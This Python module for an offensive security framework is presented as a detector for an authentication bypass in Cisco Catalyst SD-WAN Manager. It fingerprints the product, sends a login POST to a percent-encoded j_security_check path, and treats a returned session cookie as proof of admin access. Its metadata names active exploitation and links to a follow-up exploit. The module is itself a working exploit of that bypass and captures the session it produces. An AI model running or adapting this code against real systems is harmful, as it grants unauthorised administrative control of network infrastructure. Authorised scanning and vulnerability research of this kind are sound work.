#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Cisco Catalyst SD-WAN Manager CVE-2026-76504 auth bypass surface."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco SD-WAN CVE-2026-76504 Detect',
        'description': (
            'Detects CVE-2026-76504 on Cisco Catalyst SD-WAN Manager (vManage): '
            'percent-encoded j_security_check path bypasses authentication rules and '
            'returns an admin-level session cookie.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'cve': ['CVE-2026-76504'],
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2026-76504',
            'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-webauth-xr8beuuU',
        ],
        'tags': ['web', 'scanner', 'cisco', 'sd-wan', 'vmanage', 'auth-bypass', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe', 'active_exploitation'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': True,
            'produces': ['tech_hints', 'risk_signals'],
            'chain': {
                'suggested_followups': [
                    'exploits/multi/http/cisco_sdwan_cve_2026_76504_auth_bypass',
                    'scanner/http/cisco_sd_wan_detect',
                ],
            },
        },
    }

    login_path = OptString(
        '/%6a_security_check',
        'Encoded j_security_check login path (%6a = j)',
        required=False,
        advanced=True,
    )

    def _sdwan_present(self) -> bool:
        for path in ('/login', '/', '/app/login'):
            r = self.http_request(method='GET', path=path, allow_redirects=True)
            if not r:
                continue
            blob = f'{r.text or ""}\n{r.headers}'.lower()
            if any(token in blob for token in ('sd-wan', 'sdwan', 'vmanage', 'cisco catalyst')):
                return True
        return False

    def _probe_bypass(self) -> tuple[bool, str]:
        path = str(self.login_path or '/%6a_security_check')
        data = {
            'j_username': 'kittysploit-probe',
            'j_password': 'kittysploit-probe',
        }
        r = self.http_request(
            method='POST',
            path=path,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            data=data,
            allow_redirects=False,
        )
        if not r:
            return False, ''
        cookies = str(r.headers.get('Set-Cookie') or '')
        session = ''
        for token in ('JSESSIONID', 'session', 'vManage'):
            if token.lower() in cookies.lower():
                session = cookies
                break
        ok = int(r.status_code or 0) in (200, 302) and bool(session)
        if not ok and int(r.status_code or 0) in (200, 302):
            ok = 'dashboard' in (r.headers.get('Location') or '').lower()
        return ok, session[:120]

    def run(self):
        if not self._sdwan_present():
            return False
        ok, session = self._probe_bypass()
        if ok:
            self.set_info(
                severity='critical',
                cve='CVE-2026-76504',
                reason='Encoded j_security_check returned authenticated session indicators',
                cookie_hint=session or 'present',
            )
            return True
        self.set_info(
            severity='high',
            cve='CVE-2026-76504',
            reason='Cisco SD-WAN Manager detected — auth bypass not confirmed',
        )
        return True
